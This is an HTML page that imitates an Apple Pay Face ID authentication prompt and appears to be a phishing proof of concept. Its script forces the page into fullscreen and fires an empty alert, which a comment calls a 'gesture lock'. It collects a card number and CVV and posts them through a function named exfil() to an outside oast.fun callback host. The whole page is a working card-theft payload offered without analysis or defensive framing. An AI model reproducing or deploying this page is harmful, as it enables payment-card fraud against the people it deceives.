<!DOCTYPE html>
<html>
<head>
  <title>Apple Pay Authentication</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background: #000;
      color: white;
      font-family: -apple-system;
      height: 100%;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }
    #payUI {
      background: #1c1c1e;
      padding: 30px;
      border-radius: 20px;
      box-shadow: 0 0 20px rgba(255,255,255,0.1);
      width: 90%;
      max-width: 400px;
      text-align: center;
    }
    input {
      width: 100%;
      padding: 14px;
      margin-top: 10px;
      border-radius: 10px;
      border: none;
      font-size: 16px;
    }
    button {
      margin-top: 20px;
      background-color: #007aff;
      border: none;
      color: white;
      font-size: 16px;
      padding: 12px;
      border-radius: 12px;
      width: 100%;
    }
  </style>
</head>
<body>
  <div id="payUI">
    <h2>Face ID</h2>
    <p>Double-Click to Pay with Apple Pay</p>
    <input id="card" placeholder="Card Number" />
    <input id="cvv" placeholder="CVV" type="password" />
    <button onclick="exfil()">Continue</button>
  </div>

  <script>
    document.documentElement.requestFullscreen().then(() => {
      setTimeout(() => alert(""), 100); // gesture lock
    });

    function exfil() {
      fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun", {
        method: "POST",
        body: JSON.stringify({
          card: document.getElementById("card").value,
          cvv: document.getElementById("cvv").value
        }),
        mode: "no-cors"
      });
    }
  </script>
</body>
</html>
